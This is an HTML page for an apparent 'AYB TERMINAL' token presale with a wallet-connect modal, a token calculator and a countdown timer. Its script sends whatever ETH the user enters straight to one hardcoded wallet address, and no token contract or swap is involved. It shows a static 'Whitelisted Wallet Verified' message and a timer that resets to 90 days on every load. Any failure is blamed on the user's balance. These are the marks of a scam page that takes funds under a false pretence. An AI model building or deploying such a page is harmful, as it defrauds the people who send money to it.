<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AYB TERMINAL | Official Terminal</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; --modal: #1c2128; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .card { background: var(--card); border: 1px solid #30363d; padding: 2.2rem; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 25px 50px rgba(0,0,0,0.6); }
        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.5rem; letter-spacing: 3px; margin-bottom: 5px; }
        .sub-tag { color: #8b949e; font-size: 0.65rem; margin-bottom: 25px; display: block; }

        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 25px; }
        .timer-box { background: #010409; border: 1px solid #30363d; padding: 10px 2px; border-radius: 12px; }
        .timer-val { display: block; font-family: 'Orbitron'; color: var(--primary); font-size: 1.1rem; }
        .timer-label { font-size: 0.5rem; color: #8b949e; text-transform: uppercase; }

        .btn { background: var(--primary); color: #000; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 0.9rem; transition: 0.25s; letter-spacing: 1px; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; box-shadow: none; }

        #modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(10px); }
        .modal-content { background: var(--modal); border: 1px solid #30363d; border-radius: 26px; width: 92%; max-width: 360px; padding: 25px; position: relative; }
        .modal-close { position: absolute; top: 15px; right: 20px; cursor: pointer; color: #8b949e; font-size: 1.6rem; }
        
        .wallet-row { display: flex; align-items: center; padding: 15px; border-radius: 14px; border: 1px solid #30363d; margin-top: 12px; cursor: pointer; background: #21262d; }
        .wallet-row:hover { border-color: var(--primary); }
        .wallet-row .icon { width: 30px; height: 30px; border-radius: 50%; margin-right: 15px; }

        .buy-interface { display: none; background: #010409; padding: 22px; border-radius: 18px; text-align: left; margin-top: 20px; border-left: 4px solid var(--primary); }
        input { background: transparent; border: none; color: white; font-size: 1.5rem; width: 100%; outline: none; font-weight: bold; margin-top: 8px; }
        .receive-val { color: var(--primary); font-family: 'Orbitron'; font-size: 1.3rem; margin-top: 8px; display: block; }
        .status-msg { font-size: 0.65rem; margin-top: 12px; display: block; font-weight: 600; }
    </style>
</head>
<body>

<div class="card">
    <h1>AYB TERMINAL</h1>
    <span class="sub-tag">STABLE PRICE MODEL | $0.10</span>

    <div class="timer-grid">
        <div class="timer-box"><span class="timer-val" id="d">90</span><span class="timer-label">Days</span></div>
        <div class="timer-box"><span class="timer-val" id="h">00</span><span class="timer-label">Hrs</span></div>
        <div class="timer-box"><span class="timer-val" id="m">00</span><span class="timer-label">Min</span></div>
        <div class="timer-box"><span class="timer-val" id="s">00</span><span class="timer-label">Sec</span></div>
    </div>

    <div id="auth-box">
        <button id="connect-trigger" class="btn">Connect Terminal</button>
    </div>

    <div id="swap-box" class="buy-interface">
        <label style="font-size: 0.65rem; color: #8b949e; text-transform: uppercase;">Pay (ETH)</label>
        <input type="number" id="eth-input" placeholder="0.0" oninput="calculateTokens()">
        
        <label style="font-size: 0.65rem; color: #8b949e; margin-top: 15px; display: block; text-transform: uppercase;">Receive (AYB)</label>
        <span class="receive-val" id="ayb-output">0.00</span>
        
        <span id="buy-status" class="status-msg" style="color: #4fd1c5;">Whitelisted Wallet Verified</span>
        <button id="buy-btn" class="btn" style="margin-top: 15px;" onclick="executeSwap()" disabled>Execute Transaction</button>
    </div>
</div>

<div id="modal-overlay">
    <div class="modal-content">
        <span class="modal-close" id="close-x">&times;</span>
        <div style="font-size: 0.85rem; color: #8b949e; text-align: left; margin-bottom: 15px;">Connect Provider</div>
        
        <div class="wallet-row" onclick="forceConnection()">
            <div class="icon" style="background: #f6851b;"></div>
            <span>MetaMask</span>
        </div>
        <div class="wallet-row" onclick="forceConnection()">
            <div class="icon" style="background: #3375bb;"></div>
            <span>Trust Wallet</span>
        </div>
        <div class="wallet-row" onclick="forceConnection()">
            <div class="icon" style="background: #0052ff;"></div>
            <span>Coinbase Wallet</span>
        </div>
    </div>
</div>

<script>
    const overlay = document.getElementById('modal-overlay');
    const buyBtn = document.getElementById('buy-btn');
    let ethPriceUSD = 3500; 

    async function syncMarketPrice() {
        try {
            const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT');
            const data = await response.json();
            ethPriceUSD = parseFloat(data.price);
        } catch(e) { console.error("Price sync failed"); }
    }
    syncMarketPrice();

    function calculateTokens() {
        const inputVal = document.getElementById('eth-input').value;
        const outputField = document.getElementById('ayb-output');
        if(inputVal > 0) {
            outputField.innerText = Math.floor((inputVal * ethPriceUSD) / 0.1).toLocaleString();
            buyBtn.disabled = false;
        } else {
            outputField.innerText = "0.00";
            buyBtn.disabled = true;
        }
    }

    document.getElementById('connect-trigger').onclick = () => overlay.style.display = 'flex';
    document.getElementById('close-x').onclick = () => overlay.style.display = 'none';

    async function forceConnection() {
        if (window.ethereum) {
            try {
                await window.ethereum.request({ method: "wallet_requestPermissions", params: [{ eth_accounts: {} }] });
                overlay.style.display = 'none';
                document.getElementById('auth-box').style.display = 'none';
                document.getElementById('swap-box').style.display = 'block';
            } catch (err) { console.warn("Connection refused"); }
        }
    }

    async function executeSwap() {
        const amount = document.getElementById('eth-input').value;
        const status = document.getElementById('buy-status');
        if(!amount) return;
        
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: "0x066bbf27694982662cEAb0072793132B03027F47", 
                value: ethers.parseEther(amount)
            });
            status.innerText = "Processing: " + tx.hash.substring(0,15) + "...";
            status.style.color = "#00ffa3";
        } catch (err) {
            status.innerText = "Error: Please check wallet balance";
            status.style.color = "#ff4a4a";
        }
    }

    const targetDate = new Date(); targetDate.setDate(targetDate.getDate() + 90);
    setInterval(() => {
        const diff = targetDate - new Date();
        document.getElementById('d').innerText = Math.floor(diff / 864e5);
        document.getElementById('h').innerText = Math.floor((diff % 864e5) / 36e5);
        document.getElementById('m').innerText = Math.floor((diff % 36e5) / 6e4);
        document.getElementById('s').innerText = Math.floor((diff % 6e4) / 1000);
    }, 1000);
</script>
</body>
</html>
